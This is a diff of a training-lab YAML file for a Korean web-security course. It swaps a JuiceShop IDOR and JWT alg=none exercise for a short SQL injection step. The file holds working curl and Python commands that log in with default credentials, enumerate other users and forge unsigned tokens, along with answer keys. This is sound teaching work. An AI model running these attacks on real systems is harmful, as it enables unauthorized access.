@@ -1,642 +1,883 @@
-lab_id: standalone-web-vuln-week02
-title: A01 Broken Access Control — IDOR + JWT (JuiceShop hands-on)
-version: standalone-non-ai
-course: web-vuln
+lab_id: web-vuln-ai-week02
+title: SQL Injection 실습 (AI 지원)
+version: ai
+course: web-vuln-ai
 week: 2
-description: |
-  OWASP A01 (Broken Access Control) 의 *가장 흔한 2 패턴* — IDOR + JWT 변조 — 의
-  JuiceShop hands-on. login → JWT 획득 → IDOR 시퀀스 → alg=none 우회 시도 → 보고.
+description: SQL Injection 공격의 원리를 이해하고, 다양한 SQLi 기법을 실습하며 방어 방법을 학습합니다. AI SubAgent가
+  자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: medium
-duration_minutes: 180
-audience: web-vuln 2주차
-prerequisites:
-  - W01 lecture + lab 완료
-  - 학생 PC 의 curl + jq + base64 가용
-  - 6v6 의 attacker / web 컨테이너 가동
-  - JuiceShop 의 default credential (admin@juice-sh.op / admin123) 가용
+duration_minutes: 120
 objectives:
-  - JuiceShop login + JWT token 획득
-  - JWT 의 3 segment (header / payload / signature) decode
-  - Bearer header 의 IDOR 5 user 시퀀스
-  - JWT alg=none 변조 시도 + 결과 분석
-  - 보고서 작성 (5 IDOR + 변조 결과 + 권장)
-pass_threshold: 0.7
-
+- SQL Injection의 원리와 유형을 이해한다
+- Union, Blind, Error-based SQLi를 실습한다
+- SQLi 방어 기법을 이해한다
+pass_threshold: 0.6
 steps:
-
-  - order: 1
-    instruction: |
-      ## 🎯 MISSION — JuiceShop login + JWT token 획득
-
-      JuiceShop 의 `/rest/user/login` 호출 → JWT token 획득 + token 길이 + 3 segment
-      검증. 본 step 이 W02 의 *모든 다음 step 의 input*.
-
-      ## 📚 사전 학습 (학생 혼돈 방지)
-
-      - **JuiceShop** = OWASP 의 vulnerable web app (Node.js + Angular). 본 과목 의
-        *대표 target*
-      - **default credential** = `admin@juice-sh.op` / `admin123` (학습 환경 만, 실
-        product 거부)
-      - **JWT (JSON Web Token)** = RFC 7519 의 표준. 3 segment 의 *base64url* 인코딩
-      - **REST API** = `/rest/user/login` (Juice Shop 표준)
-      - **본 step 의 token** = 다음 step 의 Bearer header 의 *필수 input*
-
-      ## 💻 실행 명령
-
-      ```bash
-      ssh 6v6-attacker bash <<'SH'
-      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
-        http://10.20.30.1/rest/user/login \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
-      echo "token: $TOK" | head -c 150
-      echo ""
-      echo "length: ${#TOK}"
-      echo "segments: $(echo $TOK | tr . '\n' | wc -l)"
-      SH
-      ```
-
-      ## 📋 확인 사항
-
-      - token 길이 700+ (RS256 의 일반)
-      - segments = 3 (header.payload.signature)
-      - token 의 첫 *eyJ* 시작 (base64 의 `{` 시작)
-
-      ## 💡 왜 이걸 하는가?
-
-      JWT 가 *modern web* 의 표준 인증 토큰. 본 step 의 *획득* 이 *모든 권한 우회* 의
-      시작점.
-
-      ## 🔍 결과 해석
-
-      - **정상**: token 732 char + 3 segment + eyJ 시작
-      - **token len: 0**: login 실패 — credential 확인 또는 JuiceShop 미가동
-      - **segments != 3**: response 가 *JWT 가 아님* — `.authentication.token` 의 path 변경 가능성
-
-      ## 비정상 시 대응
-
-      - **401 Unauthorized**: admin123 비밀번호 변경 됨 — JuiceShop 의 *기본 설정* 사용
-      - **404**: `/rest/user/login` path 변경 — JuiceShop 버전 확인 (`/rest/admin/application-version`)
-      - **jq 미설치**: `apt install jq` 또는 `python3 -c "import json,sys;print(json.load(sys.stdin)['authentication']['token'])"`
-
-      ## 실측 검증 (2026-05-16)
-
-      - token length 732 ✓
-      - segments 3 ✓
-      - 이후 step 의 input PASS
-    hint: |
-      JuiceShop login → JWT 732 char + 3 segment.
-    category: experiment
-    points: 20
-    answer: |
-      ssh 6v6-attacker bash <<'SH'
-      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
-        http://10.20.30.1/rest/user/login \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
-      echo "token: $TOK" | head -c 150
-      echo ""
-      echo "length: ${#TOK}"
-      echo "segments: $(echo $TOK | tr . '\n' | wc -l)"
-      SH
-    answer_detail: JWT token 획득 + 길이 + segment 검증
-    verify:
-      type: output_contains
-      expect: 'segments: 3'
-      field: stdout
-      semantic:
-        intent: JWT 획득
-        success_criteria: [token 700+ + segments 3]
-        acceptable_methods:
-          - "**[OSS] /rest/user/login + jq .authentication.token**"
-          - "**[OSS] python3 json.load 의 path 추출**"
-          - "**[OSS] Burp Suite 의 Proxy 캡처**"
-          - "**[OSS] jwt.io 의 decode 확인 (학습 환경 만)**"
-          - "**[OSS] localStorage 의 token 검색 (브라우저 dev tools)**"
-    target_vm: attacker
-
-  - order: 2
-    instruction: |
-      ## 🎯 MISSION — JWT 3 segment decode (header + payload + signature)
-
-      step 1 의 token 의 *3 segment* 를 base64 decode → header (alg / typ) + payload
-      (claims) + signature 확인.
-
-      ## 📚 사전 학습 (학생 혼돈 방지)
-
-      - **base64url** = JWT 의 *URL-safe* base64. `+` → `-`, `/` → `_`, padding `=` 생략
-      - **header** = `{"alg":"RS256","typ":"JWT"}` 같은 *알고리즘 + 타입*
-      - **payload (claims)** = `iss / sub / exp / role / user` 등 *권한 정보*
-      - **signature** = `HMACSHA256(base64(header) + "." + base64(payload), secret)`
-      - **alg 종류** = RS256 (RSA) / HS256 (HMAC) / ES256 (ECDSA) / **none** (위험)
-
-      ## 💻 실행 명령
-
-      ```bash
-      ssh 6v6-attacker bash <<'SH'
-      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
-        http://10.20.30.1/rest/user/login \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
-
-      HEADER=$(echo $TOK | cut -d. -f1)
-      PAYLOAD=$(echo $TOK | cut -d. -f2)
-      SIG=$(echo $TOK | cut -d. -f3)
-
-      echo "=== Header ==="
-      echo $HEADER | base64 -d 2>/dev/null
-      echo ""
-      echo "=== Payload ==="
-      echo $PAYLOAD | base64 -d 2>/dev/null | jq . 2>/dev/null | head -20
-      echo ""
-      echo "=== Signature (base64url) ==="
-      echo "$SIG" | head -c 80
-      echo " (length: ${#SIG})"
-      SH
-      ```
-
-      ## 📋 확인 사항
-
-      - Header 의 `alg` (RS256 또는 HS256) + `typ: JWT`
-      - Payload 의 claims (`data.id`, `data.email`, `data.role`, `iat`, `exp`)
-      - Signature 의 *base64url* (약 256-512 char)
-
-      ## 💡 왜 이걸 하는가?
-
-      JWT 의 *내부 구조* 인지 = 변조 의 *기반*. payload 의 `role` 또는 `id` 변조 시도
-      의 *직전 단계*.
-
-      ## 🔍 결과 해석
-
-      - **정상**: Header + Payload + Signature 모두 출력
-      - **base64 decode 실패**: padding 부족 — `echo $HEADER==`  (= 추가)
-      - **Payload jq error**: JSON 형식 X — raw 출력 그대로
-
-      ## 비정상 시 대응
-
-      - **base64 의 padding 오류** — `echo "$HEADER" | sed 's/$/==/' | base64 -d 2>/dev/null`
-      - **alg 가 none**: 매우 의심 — 즉시 보고 (실 운영 의 critical bug)
-    hint: |
-      JWT cut -d. → base64 -d → header + payload + signature.
-    category: analysis
-    points: 20
-    answer: |
-      ssh 6v6-attacker bash <<'SH'
-      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
-        http://10.20.30.1/rest/user/login \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
-      HEADER=$(echo $TOK | cut -d. -f1)
-      PAYLOAD=$(echo $TOK | cut -d. -f2)
-      SIG=$(echo $TOK | cut -d. -f3)
-      echo "=== Header ==="; echo $HEADER | base64 -d 2>/dev/null
-      echo ""; echo "=== Payload ==="; echo $PAYLOAD | base64 -d 2>/dev/null | jq . 2>/dev/null | head -20
-      echo ""; echo "=== Signature ==="; echo "$SIG" | head -c 80; echo " (length: ${#SIG})"
-      SH
-    answer_detail: 3 segment decode (header alg + payload claims + signature)
-    verify:
-      type: output_contains
-      expect: 'alg'
-      field: stdout
-      semantic:
-        intent: JWT 3 segment decode
-        success_criteria: [Header + Payload + Signature]
-        acceptable_methods:
-          - "**[OSS] cut -d. + base64 -d**"
-          - "**[OSS] jwt-cli (npm install -g jwt-cli)**"
-          - "**[OSS] python3 의 PyJWT decode**"
-          - "**[OSS] jwt.io online debugger (학습 환경 만)**"
-          - "**[OSS] Burp 의 JWT Editor extension**"
-    target_vm: attacker
-
-  - order: 3
-    instruction: |
-      ## 🎯 MISSION — Bearer header 의 IDOR 5 user 시퀀스 + no-auth 비교
-
-      JWT 획득 후 *Bearer header* 로 `/api/Users/{1..5}` 5 user 시퀀스 + Bearer 없는
-      no-auth 응답 비교. *IDOR 의 핵심* — 본인 token 으로 *다른 user* 데이터 조회.
-
-      ## 📚 사전 학습 (학생 혼돈 방지)
-
-      - **IDOR** = Insecure Direct Object Reference — 권한 검증 없는 *직접 참조*
-      - **Bearer header** = `Authorization: Bearer <JWT>` 의 표준
-      - **5 user** = JuiceShop 의 기본 user 5 (id 1-5)
-      - **본인 token = id 1 (admin)** — admin 의 *모든 user 조회* 권한 = *권한 분리
-        결함*
-      - **W08 step 3** 와 연결 = attack 의 동일 패턴
-
-      ## 💻 실행 명령
-
-      ```bash
-      ssh 6v6-attacker bash <<'SH'
-      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
-        http://10.20.30.1/rest/user/login \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
-
-      echo "=== IDOR with Bearer ==="
-      for id in 1 2 3 4 5; do
-        code=$(curl -s -o /dev/null -w '%{http_code}' \
-          -H 'Host: juice.6v6.lab' -H "Authorization: Bearer $TOK" \
-          http://10.20.30.1/api/Users/$id)
-        echo "user $id: $code"
-      done
-
-      echo ""
-      echo "=== no-auth (Bearer 없이) ==="
-      for id in 1 2 3 4 5; do
-        code=$(curl -s -o /dev/null -w '%{http_code}' \
-          -H 'Host: juice.6v6.lab' \
-          http://10.20.30.1/api/Users/$id)
-        echo "user $id (no auth): $code"
-      done
-
-      echo ""
-      echo "=== user 2 의 데이터 (Bearer) ==="
-      curl -s -H 'Host: juice.6v6.lab' -H "Authorization: Bearer $TOK" \
-        http://10.20.30.1/api/Users/2 | jq . 2>/dev/null | head -15
-      SH
-      ```
-
-      ## 📋 확인 사항
-
-      - Bearer 5 user 모두 200 (admin token 으로 *모든 user* 조회)
-      - no-auth 5 user 모두 401 (정상 인증 거부)
-      - user 2 의 데이터 = email / username / password (hash) / role
-      - admin role 의 *권한 분리 결함* 인지
-
-      ## 💡 왜 이걸 하는가?
-
-      *modern API* 의 가장 흔한 결함 = *role-based 검증 부족*. admin 이 *본인 외 user
-      조회* 가능 = *최소 권한 원칙 위반*.
-
-      ## 🔍 결과 해석
-
-      - **정상 (vuln)**: Bearer 5×200 + no-auth 5×401 + user 2 의 password hash 노출
-      - **Bearer 도 401**: token expire — re-login
-      - **모든 user 같은 데이터**: API mock — 실 DB 가 아님 (학습 환경 확인)
-
-      ## 비정상 시 대응
-
-      - **403 (admin 외 user 거부)**: JuiceShop 의 *권한 분리 적용* — 본 vuln 정정 된 버전
-      - **password 노출 X**: API response 의 *필드 필터* — `?fields=*` 또는 query 추가
-        시도
-
-      ## 실측 검증 (2026-05-16)
-
-      - Bearer with token=200 (user 1-3 PASS) ✓
-      - no-auth=401 (정상 인증 거부) ✓
-    hint: |
-      Bearer header IDOR 5 user vs no-auth 비교 + user 2 data 분석.
-    category: exploit
-    points: 25
-    answer: |
-      ssh 6v6-attacker bash <<'SH'
-      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
-        http://10.20.30.1/rest/user/login \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
-      for id in 1 2 3 4 5; do
-        echo "user $id (Bearer): $(curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' -H "Authorization: Bearer $TOK" http://10.20.30.1/api/Users/$id)"
-      done
-      for id in 1 2 3 4 5; do
-        echo "user $id (no auth): $(curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' http://10.20.30.1/api/Users/$id)"
-      done
-      curl -s -H 'Host: juice.6v6.lab' -H "Authorization: Bearer $TOK" http://10.20.30.1/api/Users/2 | jq . 2>/dev/null | head -15
-      SH
-    answer_detail: IDOR 5 user × Bearer vs no-auth + data 분석
-    verify:
-      type: output_contains
-      expect: 'user 1 (Bearer): 200'
-      field: stdout
-      semantic:
-        intent: IDOR with Bearer 5 user
-        success_criteria: [Bearer 5 user × 200 + no-auth 401]
-        acceptable_methods:
-          - "**[OSS] Bearer header curl loop**"
-          - "**[OSS] Burp Intruder Sniper (1 param) 또는 Pitchfork**"
-          - "**[OSS] OWASP ZAP 의 Fuzzer**"
-          - "**[OSS] sqlmap 가 아닌 일반 API enum**"
-          - "**[OSS] CWE-639 Authorization Bypass Through User-Controlled Key**"
-          - "**[OSS] HackTricks IDOR cheat sheet**"
-    target_vm: attacker
-
-  - order: 4
-    instruction: |
-      ## 🎯 MISSION — JWT alg=none 변조 시도 + 결과 분석
-
-      JWT header 의 `alg` 를 `RS256` → `none` 변조 + signature 제거 + IDOR 재시도.
-      대부분 modern lib (2020+) 에서 차단 — 본 step 은 *시도 + 결과 분석* 학습.
-
-      ## 📚 사전 학습 (학생 혼돈 방지)
-
-      - **alg=none** = JWT 표준 의 *서명 X* 모드. RFC 7519 에 명시
-      - **2015 의 critical bug** = 많은 JWT lib 의 *alg=none* 자동 통과 — 토큰 변조 가능
-      - **2024 의 modern lib** = `alg=none` 거부 default. 단 *legacy code* 에 여전 가능
-      - **변조 절차** = (1) header 변조 (RS256 → none) (2) payload 변조 (옵션 — role
-        변경 등) (3) signature 제거
-
-      ## 💻 실행 명령
-
-      ```bash
-      ssh 6v6-attacker bash <<'SH'
-      # 1) 원본 token 획득
-      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
-        http://10.20.30.1/rest/user/login \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
-      PAYLOAD=$(echo $TOK | cut -d. -f2)
-
-      # 2) 변조 header (alg: none)
-      NEW_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
-
-      # 3) 변조 token (header.payload. — signature 빈 문자)
-      EVIL_TOK="${NEW_HEADER}.${PAYLOAD}."
-
-      echo "=== Original token (head) ==="
-      echo $TOK | head -c 80
-      echo ""
-      echo "=== Evil token (alg=none) ==="
-      echo $EVIL_TOK | head -c 100
-      echo ""
-
-      # 4) Evil token 으로 IDOR 시도
-      for id in 1 2 3; do
-        code=$(curl -s -o /dev/null -w '%{http_code}' \
-          -H 'Host: juice.6v6.lab' -H "Authorization: Bearer $EVIL_TOK" \
-          http://10.20.30.1/api/Users/$id)
-        echo "user $id (alg=none): $code"
-      done
-      SH
-      ```
-
-      ## 📋 확인 사항
-
-      - Evil token 의 *3 segment* (header.payload.)
-      - 응답 코드 (401 = 정상 차단 / 200 = vuln)
-      - 차단 시 의 응답 body (`Authorization` error message)
-
-      ## 💡 왜 이걸 하는가?
-
-      JWT 의 *2015 critical bug* (alg=none 통과) 의 *현재 modern lib 의 대응* 확인.
-      *legacy code* 의 *여전 한 위험* 인지.
-
-      ## 🔍 결과 해석
-
-      - **정상 (modern)**: 5 user 모두 401 + "invalid algorithm" 응답
-      - **vuln (legacy)**: 5 user 모두 200 + 본인 외 user 데이터 노출
-      - **403**: ModSec 또는 다른 WAF 가 차단
-
-      ## 비정상 시 대응
-
-      - **모두 200 (vuln)**: 즉시 보고 + JuiceShop 의 *legacy mode* 또는 *교육 의도*
-        확인
-      - **응답 body 분석**: `curl ... | head` 로 error message 확인
-    hint: |
-      alg=none 변조 + signature 제거 + IDOR retry → 401 (modern) 또는 200 (vuln).
-    category: exploit
-    points: 25
-    answer: |
-      ssh 6v6-attacker bash <<'SH'
-      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
-        http://10.20.30.1/rest/user/login \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
-      PAYLOAD=$(echo $TOK | cut -d. -f2)
-      NEW_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
-      EVIL_TOK="${NEW_HEADER}.${PAYLOAD}."
-      echo "Evil: $EVIL_TOK" | head -c 100
-      echo ""
-      for id in 1 2 3; do
-        echo "user $id (alg=none): $(curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' -H "Authorization: Bearer $EVIL_TOK" http://10.20.30.1/api/Users/$id)"
-      done
-      SH
-    answer_detail: alg=none 변조 + 5 user IDOR retry + 응답 분석
-    verify:
-      type: output_contains
-      expect: 'alg=none'
-      field: stdout
-      semantic:
-        intent: JWT alg=none 변조
-        success_criteria: [Evil token + 응답 코드 분석]
-        acceptable_methods:
-          - "**[OSS] base64 + sed 의 수동 변조**"
-          - "**[OSS] jwt_tool (Python)**"
-          - "**[OSS] Burp 의 JWT Editor extension**"
-          - "**[OSS] CWE-345 Authentication Bypass Using Insufficient Verification**"
-          - "**[OSS] OWASP A02 + A07 의 결합**"
-    target_vm: attacker
-
-  - order: 5
-    instruction: |
-      ## 🎯 MISSION — W02 보고서 작성 (5 IDOR + JWT 변조 + 권장)
-
-      W02 의 step 1-4 결과 종합 보고서. *임원 + 운영 + 분석가* 의 3 청자 의 *동시
-      만족* 형식.
-
-      ## 📚 사전 학습 (학생 혼돈 방지)
-
-      - **3 청자** = (1) CISO/임원 (관리 결정) (2) 운영자 (즉시 패치) (3) 분석가 (재현)
-      - **PTES 표준** = W15 기말 의 *전체 보고서* 의 축약 형
-      - **CVSS 3.1** = 본 vuln 의 *위험도 점수* 산정 (0-10)
-      - **CWE 매핑** = CWE-639 (IDOR) + CWE-345 (alg=none)
-      - **본 step 의 산출물** = W02 의 *유일 한 평가 산출물*
-
-      ## 💻 산출물 (4 섹션 보고서)
-
-      ```markdown
-      # W02 — A01 Broken Access Control 분석 보고서
-
-      ## 1. Executive Summary (임원)
-      - target: JuiceShop (juice.6v6.lab, 학습 환경)
-      - 발견 vuln 2 종 — IDOR (Bearer with admin token) + JWT alg=none 시도
-      - CVSS 8.2 (High) + CVSS 9.1 (Critical) 추정
-      - 권장: 즉시 *role-based access control* 적용 + JWT alg whitelist
-
-      ## 2. Detailed Findings (분석가)
-      ### F1 — IDOR (CWE-639)
-      - Reproduction: admin@juice-sh.op login → Bearer header → /api/Users/{1..5}
-      - 결과: 5 user 모두 200 (admin 외 user 데이터 노출)
-      - 영향: 모든 user 의 email / password hash / role 노출
-      - 근본 원인: API 의 *role 검증* 없이 *token 만* 으로 접근 허용
-
-      ### F2 — JWT alg=none (CWE-345)
-      - Reproduction: header 의 RS256 → none + signature 제거
-      - 결과: 401 (정상 차단) 또는 200 (vuln, modern lib 의 patch 적용 안 된 경우)
-      - 영향: signature 검증 우회 → 임의 user 의 token 생성 가능
-      - 근본 원인: JWT library 의 *alg whitelist* 없음
-
-      ## 3. Remediation (운영자)
-      ### F1 IDOR
-      - 즉시: API 의 *role check* 추가 — `if user.role != 'admin' and target.id != user.id: 403`
-      - 단기: Express middleware 추가 — `requireAdmin` decorator
-      - 장기: OWASP A01 의 *13 권장* 모두 적용
-
-      ### F2 JWT alg=none
-      - 즉시: JWT lib 의 *alg whitelist* (RS256 만 허용) 명시
-      - 단기: signature 검증 의 *unit test* 추가
-      - 장기: JWT → *paseto* 또는 *opaque session* 마이그레이션
-
-      ## 4. ATT&CK + CVSS + CWE 매핑
-      | Finding | ATT&CK | CVSS | CWE |
-      |---------|--------|------|-----|
-      | IDOR | T1078 Valid Accounts | 8.2 (H) | CWE-639 |
-      | alg=none | T1556 Modify Auth | 9.1 (C) | CWE-345 |
-      ```
-
-      ## 📋 확인 사항
-
-      - 4 섹션 모두 작성 (Executive / Findings / Remediation / 매핑)
-      - 2 findings 각 의 reproduction step + 영향 + 근본 원인 명시
-      - 운영자 권장 = 즉시 / 단기 / 장기 의 3 단계
-      - CVSS + CWE + ATT&CK 매핑
-
-      ## 💡 왜 이걸 하는가?
-
-      모의해킹 *마지막 단계* = 보고서. *기술 (Findings)* + *관리 (Remediation)* + *지표
-      (매핑)* 의 3 축 가 *임원 의 결정 + 운영자 의 즉시 행동* 의 input.
-
-      ## 🔍 결과 해석
-
-      - **정상**: 4 섹션 + 2 findings + 3 단계 권장 + 3 매핑
-      - **운영자 권장 추상적 ("보안 강화")**: 즉시 / 단기 / 장기 의 구체 명령 필수
-      - **매핑 누락**: CVSS / CWE / ATT&CK 표준 표 필수
-    hint: |
-      4 섹션 (Executive / Findings / Remediation / 매핑) + 2 findings 의 3 단계
-      권장 + 3 매핑.
-    category: synthesis
-    points: 10
-    answer: 위 4 섹션 형식 따라 작성
-    answer_detail: 4 섹션 보고서 (Executive + Findings + Remediation + 매핑)
-    verify:
-      type: output_contains
-      expect: 'CWE-639'
-      field: stdout
-      semantic:
-        intent: 4 섹션 보고서
-        success_criteria: [4 섹션 + 2 findings + 3 매핑]
-        acceptable_methods:
-          - "**[관리적] PTES 보고서 형식**"
-          - "**[관리적] CVSS 3.1 의 8 metric**"
-          - "**[관리적] CWE Top 25 매핑**"
-          - "**[관리적] MITRE ATT&CK Tactic + Technique**"
-          - "**[관리적] OWASP A01 의 13 권장**"
-          - "**[관리적] 한국 ISMS-P 통제 매핑**"
-          - "**[관리적] 임원 + 운영 + 분석가 의 3 청자**"
-    target_vm: bastion
-
-  # ============================================================
-  # STEP 6 — R/B/P 종합 mission (IDOR + JWT alg=none 의 1 cycle)
-  # ============================================================
-  - order: 6
-    instruction: |
-      ## 🎯 MISSION (R/B/P 종합)
-
-      본 주차 의 IDOR + JWT alg=none 의 1 cycle. **Red = 자신 token 의 IDOR + alg=none
-      token 시도 / Blue = access.log + ModSec 의 standard 룰 의 비매치 / Purple =
-      ModSec custom rule + application ACL 의 필요성 분석**.
-
-      ## 📖 시나리오 상세
-
-      ### 🔴 Red Team — 정상 사용자 의 권한 escalation
-
-      **페르소나**: 정상 로그인 사용자 (user@me) — 외부 attacker 아닌 **내부 권한 의
-      misuse**. APT 의 lateral movement + bug bounty 의 IDOR 발굴 의 시뮬. JuiceShop
-      의 의도 적 vuln 의 학습 환경.
-
-      **공격 의도**:
-      1. IDOR 의 boundary 검증 — 본인 (id=2) token 으로 admin (id=1) data 의 조회
-         → application 의 ACL 부재 검증
-      2. JWT alg=none 의 signature 검증 우회 — header alg = "none" 변조 = signature
-         검증 X 가설 의 검증
-      3. HTTP form 정상성 = ModSec 표준 CRS 의 매치 X 가설 → application 의 책임 의
-         분리 학습
-
-      **공격 단계**:
-      - R1: 정상 login (POST /rest/user/login) = JWT token 획득
-      - R2: 본인 token 으로 /api/Users/1 GET = IDOR 시도
-      - R3: python 으로 alg=none + payload.id=1 token 생성 + 재시도
-
-      ### 🔵 Blue Team — HTTP 정상성 의 한계 + application audit
-
-      **탐지 source**:
-      - ModSec audit log = 매치 X (HTTP 정상 + CRS 의 IDOR/JWT custom rule 부재) =
-        **detection blind spot**
-      - Apache access.log = 200 응답 + /api/Users/1 호출 기록 만 = 사후 audit 가능
-      - Wazuh = standard 룰 매치 X = alert 부재
-
-      **대응 절차**:
-      - B1: access.log 의 특정 user_id 의 burst 분석 = sliding window detection
-      - B2: application layer 의 user_id 비교 코드 의 audit
-      - B3: ModSec custom rule (Authorization header 의 alg=none 패턴) 의 추가
-
-      ### 🟣 Purple Team — 2 layer defense + custom rule routine
-
-      **분석**:
-      - "HTTP 정상 = ModSec 의 detection blind spot" 의 직접 확인 + application ACL
-        의 책임 의 명확화
-      - JWT 의 표준 검증 (signature + alg whitelist) 의 application 의 의무
-
-      **개선 cycle**:
-      1. defense in depth = application ACL (1차) + ModSec custom rule (2차)
-      2. JWT alg whitelist 의 강제 = backend 의 `algorithms: ['HS256']` 명시
-      3. per-user ACL middleware = 모든 /api/Users/:id 의 token vs path 비교
-      4. 분기 review = bug bounty IDOR finding routine + KG anchor 누적
-
-      ## 💻 실행 명령
-
-      ```bash
-      # Red — login + IDOR
-      TOKEN=$(ssh 6v6-attacker 'curl -s -d "{\"email\":\"user@me\",\"password\":\"user\"}" -H "Content-Type: application/json" -H "Host: juice.6v6.lab" http://10.20.30.1/rest/user/login | jq -r .authentication.token')
-      ssh 6v6-attacker "curl -s -H 'Authorization: Bearer $TOKEN' -H 'Host: juice.6v6.lab' http://10.20.30.1/api/Users/1 | jq ."
-
-      # Red — alg=none token 생성
-      ssh 6v6-attacker 'python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({\"alg\":\"none\",\"typ\":\"JWT\"}).encode()).rstrip(b\"=\").decode(); p=base64.urlsafe_b64encode(json.dumps({\"id\":1}).encode()).rstrip(b\"=\").decode(); print(h+\".\"+p+\".\")"'
-
-      # Blue — access.log
-      ssh 6v6-web "sudo tail -20 /var/log/apache2/access.log | grep '/api/Users/'"
-
-      # Purple — Coverage 한 줄
-      echo "Coverage: ModSec 표준 매치 X (HTTP 정상). application ACL + custom rule 필요"
-      ```
-
-      ## 📋 확인 사항
-
-      - IDOR 응답 = 200 + 다른 user data (JuiceShop = 의도 vuln)
-      - alg=none token = `header.payload.` (signature 비어 있음)
-      - access.log = 정상 200 응답 (alert X)
-      - Purple Coverage = ModSec custom rule 의 필요성
-
-      ## 💡 왜 이걸 하는가?
-
-      IDOR + JWT 의 R/B/P 특수성 = HTTP 형식 의 정상 → ModSec 의 사후 detection 의
-      한계. application ACL + ModSec custom rule 의 2 layer defense 의 직접 확인.
-
-      ## 🔍 결과 해석
-
-      - **정상**: IDOR 200 + alg=none token 생성 + Coverage 한 줄
-      - **비정상 1**: TOKEN 비어 있음 = login 실패 → user 계정 등록 확인
-      - **비정상 2**: IDOR 403 = JuiceShop 패치 → 학습 환경 vuln 활성 확인
-    hint: 'TOKEN=...login; curl -H Authorization /api/Users/1'
-    category: rbp_integration
-    points: 6
-    answer: |
-      echo "=== Red: login + IDOR ==="
-      TOKEN=$(ssh 6v6-attacker 'curl -s -d "{\"email\":\"user@me\",\"password\":\"user\"}" -H "Content-Type: application/json" -H "Host: juice.6v6.lab" http://10.20.30.1/rest/user/login | jq -r .authentication.token' 2>/dev/null)
-      ssh 6v6-attacker "curl -s -H 'Authorization: Bearer $TOKEN' -H 'Host: juice.6v6.lab' http://10.20.30.1/api/Users/1 | head -c 200"
-      echo ""
-      echo "=== Red: alg=none token ==="
-      ssh 6v6-attacker 'python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({\"alg\":\"none\",\"typ\":\"JWT\"}).encode()).rstrip(b\"=\").decode(); p=base64.urlsafe_b64encode(json.dumps({\"id\":1}).encode()).rstrip(b\"=\").decode(); print(h+\".\"+p+\".\")"'
-      echo "=== Blue: access.log ==="
-      ssh 6v6-web "sudo tail -20 /var/log/apache2/access.log | grep '/api/Users/' | head -3"
-      echo "=== Purple ==="
-      echo "Coverage: ModSec 표준 매치 X, application ACL + ModSec custom rule 필요"
-    answer_detail: |
-      IDOR + JWT alg=none 의 1 cycle. ModSec 표준 룰 의 한계 + application 책임 +
-      custom rule 의 필요성 의 직접 확인.
-    verify:
-      type: output_contains
-      expect: 'Coverage'
-      field: stdout
-      semantic:
-        intent: IDOR + JWT alg=none 의 R/B/P 1 cycle 분석
-        success_criteria:
-          - IDOR 시도 + 응답 분석
-          - alg=none token 생성
-          - Purple Coverage Gap 한 줄
-        acceptable_methods:
-          - "**[OSS] curl IDOR + python alg=none + jq access.log**"
-          - "**[OSS] Burp Repeater manual IDOR**"
-    target_vm: attacker
+- order: 1
+  instruction: '대상 웹 애플리케이션(http://{{WEB_IP}})의 검색 기능에서 SQL Injection 가능성을 테스트하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_detection` 에 적합한 도구: sqlmap --batch --dbs.
+    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 작은따옴표(')를 입력하여 에러를 유발하세요.
+  category: sqli_detection
+  points: 10
+  answer: '🤖 프롬프트: 대상 웹 애플리케이션(http://10.20.30.80)의 검색 기능에서 SQL Injection 가능성을 테스트해줘
+
+    📎 참고 (CLI): curl -s ''http://10.20.30.80/rest/products/search?q=test%27'' 2>/dev/null
+    | head -20'
+  answer_detail: 작은따옴표 입력 시 SQL 에러가 발생하면 SQLi 취약점이 존재할 가능성이 높습니다.
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+    semantic:
+      intent: SQL Injection 가능성 탐색 — 검색 파라미터에 따옴표·연산자 삽입 후 에러/동작 변화 관찰
+      success_criteria:
+      - 검색 파라미터에 apostrophe 또는 SQL 메타문자 삽입 시도
+      - 정상 요청과 주입 요청의 응답 차이 비교
+      - SQLi 판정 근거 (SQL 에러·레코드 수 변화) 제시
+      acceptable_methods:
+      - curl로 apostrophe 포함 파라미터 전송
+      - Burp Repeater 로 요청 변조
+      - sqlmap 초기 탐지 --batch
+      - python requests 로 자동화
+      negative_signs:
+      - 메타문자 없이 정상 요청만
+      - 응답 비교 없음
+      - 판정 근거 없음
+  target_vm: attacker
+  script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27' 2>/dev/null
+    | head -20
+  risk_level: low
